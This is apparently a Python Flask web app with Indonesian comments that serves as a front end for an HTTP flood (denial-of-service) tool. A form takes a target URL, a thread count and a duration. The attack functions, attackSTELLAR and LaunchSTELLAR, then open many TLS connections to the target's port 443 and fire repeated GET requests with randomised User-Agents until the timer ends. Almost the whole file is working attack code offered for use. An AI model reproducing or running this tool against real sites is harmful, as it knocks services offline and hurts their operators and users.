from flask import Flask, render_template, request, redirect, url_for
import os
import threading
import time
import socket
import ssl
import random
from urllib.parse import urlparse
import datetime
from sys import stdout
from colorama import Fore, init

# Inisialisasi Flask
app = Flask(__name__)

# Colors
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING

# Clear console
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Attack function
def attackSTELLAR(url, timer, threads):
    for _ in range(threads):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

# Attack process
def LaunchSTELLAR(url, timer):
    end_time = time.time() + timer
    req = (
        f"GET / HTTP/1.1\r\nHost: {urlparse(url).netloc}\r\n"
        "Cache-Control: no-cache\r\n"
        f"User-Agent: {random.choice(ua)}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        "Sec-Fetch-Site: same-origin\r\n"
        "Sec-GPC: 1\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Connection: Keep-Alive\r\n\r\n"
    )
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((urlparse(url).netloc, 443))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(req.encode())
            try:
                for _ in range(100):
                    s.send(req.encode())
            except Exception as e:
                print(f"{M2}Terjadi kesalahan saat mengirim permintaan: {e}")
            finally:
                s.close()
        except Exception as e:
            print(f"{M2}Kesalahan koneksi: {e}")

# Countdown function
def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=t)
    while True:
        remaining_time = (until - datetime.datetime.now()).total_seconds()
        if remaining_time > 0:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}•{Fore.WHITE} Status serangan => {remaining_time:.2f} detik tersisa ")
        else:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}•{Fore.WHITE} Serangan selesai!\n")
            return

# Route untuk halaman utama
@app.route('/')
def index():
    return render_template('index.html')

# Route untuk menjalankan script
@app.route('/run', methods=['POST'])
def run_script():
    target = request.form['target']
    thread = int(request.form['thread'])
    time_duration = int(request.form['time'])

    # Validasi input
    if not target or thread <= 0 or time_duration <= 0:
        return "Input tidak valid, silakan coba lagi."

    # Jalankan serangan
    threading.Thread(target=attackSTELLAR, args=(target, time_duration, thread)).start()
    countdown_thread = threading.Thread(target=countdown, args=(time_duration,))
    countdown_thread.start()
    countdown_thread.join()

    return redirect(url_for('index'))

# Entry point untuk menjalankan Flask
if __name__ == '__main__':
    init(convert=True)
    ua = open('ua.txt', 'r').read().splitlines()  # Pastikan Anda memiliki file 'ua.txt'
    app.run(debug=True)
